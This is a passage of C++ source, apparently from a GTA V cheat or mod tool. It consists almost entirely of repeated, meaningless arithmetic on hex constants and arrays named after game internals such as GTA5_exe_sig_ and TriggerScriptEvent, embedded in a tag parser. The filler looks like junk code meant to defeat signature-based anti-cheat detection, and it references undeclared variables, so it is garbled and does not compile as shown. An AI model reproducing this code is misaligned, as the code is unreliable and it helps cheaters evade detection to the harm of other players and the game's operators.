						if (GTA5_exe_sig_[4] > 50.0f)
						{
							GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
						}
						a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
						a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
						offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
						NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
						a = 0.0f;
						a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
						b = 0.0f;
						GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
						a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
						offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
						GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
						GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
						GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
						GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
						offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
						offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
						GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
						a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
						a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
						offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
						offset = (0xB1231 * 0xA) + 0xA12;
						offset = (0xB1231 * 0xA) + 0xA12;
						if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
						}
						else
							a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
						a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

						if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
							GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
							GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
							GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
							GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
							GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
							a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
							a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
						}
						else
						{
							GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
							GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
							GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
							GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
							GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
							GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
							a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
							a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
						}
						GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
						a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
						GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
						a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
						a = 0.0f;
						b = 0.0f;
						if (GTA5_exe_sig_[4] > 50.0f)
						{
							GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
						}
						a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
						a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
						GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
						GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
						NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
						a = 0.0f;
						a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
						b = 0.0f;
						GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
						a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
						GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
						GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
						GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
						GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
						GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
						GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
						GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
						GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
						a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
						a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
						GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
						GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
						GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
						if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
						}
						else
							a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
						a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


						if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
							TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
							TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
							TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
							TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
							TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
							a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
							a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
						}
						else
						{
							offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
							offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
							offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
							offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
							offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
							offset = (0xB1231 * 0xA) + 0xA12;
							a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
							a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
						}
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (5) / (2 * TriggerScriptEvent[2]);
						a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
						a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
						if (TriggerScriptEvent[4] > 50.0f)
						{
							TriggerScriptEvent[4] = TriggerScriptEvent[1];
						}
						a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
						a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
						offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
						NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
						a = 0.0f;
						a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
						b = 0.0f;
						TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
						a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
						offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
						TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
						TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
						TriggerScriptEvent[4] = TriggerScriptEvent[1];
						TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
						offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
						offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
						TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
						a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
						a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
						offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
						offset = (0xB1231 * 0xA) + 0xA12;
						offset = (0xB1231 * 0xA) + 0xA12;
						if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
						}
						else
							a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
						a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

						if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
							TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
							TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
							TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
							TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
							TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
							a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
							a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
						}
						else
						{
							TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
							TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
							TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
							TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
							TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
							TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
							a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
							a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
						}
						TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
						a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
						TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
						a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
						a = 0.0f;
						b = 0.0f;
						if (TriggerScriptEvent[4] > 50.0f)
						{
							TriggerScriptEvent[4] = TriggerScriptEvent[1];
						}
						a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
						a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
						TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
						TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
						NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
						a = 0.0f;
						a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
						b = 0.0f;
						TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
						a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
						TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
						TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
						TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
						TriggerScriptEvent[4] = TriggerScriptEvent[1];
						TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
						TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
						TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
						TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
						a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
						a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
						TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
						TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
						TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
						if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
						}
						else
							a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
						a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
						tokens.push_back(b);
					}
					else if (Extern_Reader::StringManager::SeContemTexto(token, "<Pitch>"))
					{

					if (offset > aaaaaa)
					{
						matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
						matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
						matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
						matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
						matriz[7] = (0xB1231 * 0xA) + matriz[2];
						a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
						a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
					}
					else
					{
						offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
						offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
						offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
						offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
						offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
						a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
					}
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
					if (matriz[4] > 50.0f)
					{
						matriz[4] = matriz[1];
					}
					a2 = (matriz[4]) / (2 * matriz[2]);
					a1 = (matriz[3] + (2)) / (2 * matriz[2]);
					offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (matriz[3] + (5)) / (2 * matriz[2]);
					aaaaaa = ponteiro * 2;
					a = 0.0f;
					a1 = (matriz[3] + (4)) / (2 * matriz[2]);
					b = 0.0f;
					matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
					a2 = (matriz[4] + (3)) / (2 * matriz[2]);
					offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
					matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
					matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
					matriz[4] = matriz[1];
					matriz[7] = (0xB1231 * 0xA) + matriz[2];
					offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
					offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
					matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
					a2 = (matriz[4] + (3)) / (2 * matriz[2]);
					a2 = (matriz[4] + (2)) / (2 * matriz[2]);
					offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					offset = (0xB1231 * 0xA) + 0xA12;
					if (offset > aaaaaa)
					{
					}
					else
						a1 = (matriz[3] + (65)) / (2 * matriz[2]);
					a2 = (matriz[4] - (3)) / (2 * matriz[2]);

					if (matriz[1] > aaaaaa)
					{
						matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
						matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
						matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
						matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
						matriz[7] = (0xB1231 * 0xA) + matriz[2];
						a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
						a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
					}
					else
					{
						matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
						matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
						matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
						matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
						matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
						matriz[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
						a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
					}
					matriz[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
					matriz[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
					a = 0.0f;
					b = 0.0f;
					if (matriz[4] > 50.0f)
					{
						matriz[4] = matriz[1];
					}
					a2 = (matriz[4]) / (2 * matriz[2]);
					a1 = (matriz[3] + (2)) / (2 * matriz[2]);
					matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
					matriz[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (matriz[3] + (5)) / (2 * matriz[2]);
					aaaaaa = 0xB2 * 2;
					a = 0.0f;
					a1 = (matriz[3] + (4)) / (2 * matriz[2]);
					b = 0.0f;
					matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
					a2 = (matriz[4] + (3)) / (2 * matriz[2]);
					matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
					matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
					matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
					matriz[4] = matriz[1];
					matriz[7] = (0xB1231 * 0xA) + matriz[2];
					matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
					matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
					matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
					a2 = (matriz[4] + (3)) / (2 * matriz[2]);
					a2 = (matriz[4] + (2)) / (2 * matriz[2]);
					matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
					matriz[1] = (0xB1231 * 0xA) + 0xA12;
					matriz[1] = (0xB1231 * 0xA) + 0xA12;
					if (matriz[1] > aaaaaa)
					{
					}
					else
						a1 = (matriz[3] + (65)) / (2 * matriz[2]);
					a2 = (matriz[4] - (3)) / (2 * matriz[2]);

					if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
					{
						GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
						GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
						GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
						GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
						GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
						a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
						a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
					}
					else
					{
						offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
						offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
